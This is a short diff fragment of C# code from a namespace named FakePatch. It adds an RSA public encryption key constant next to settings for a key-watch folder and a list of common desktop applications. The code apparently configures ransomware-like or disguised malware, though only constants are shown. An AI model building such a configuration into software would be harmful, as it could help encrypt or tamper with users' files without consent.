@@ -18,6 +18,7 @@ namespace FakePatch
         public static string gKeyWatchPath = @"C:\keywatch";
         public static string gKeyTxtFileName = @"key.txt";
         public const int gKeyTxtSize = 1024;
+        public const string gEncryptKeyXML = "<RSAKeyValue><Modulus>4IAQMo8/RljNnFWhiwc25c2/zTANKQvftADzCFWYLZwsvuK0wKXv2YPzN3WCLPys53ftQi+l30Bpex1JRJsEd3dGdkVwzZ0moD7JQKmIW0xgVl48R+0bgRAwCyrVrnAKABi/lOBp0ipYu3BMw0yMC8EiAY915dxXGzYqt3ezx70=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
         public const string gEventLogName = "MyNewLog";
         public const string gEventSourceName = "MySource";
         public static string[] gFilePaths = { @"excel.exe", @"winword.exe", @"powerpnt.exe", @"mspub.exe", @"msaccess.exe", @"outlook.exe", @"vlc.exe", @"chrome.exe", @"itunes.exe" };
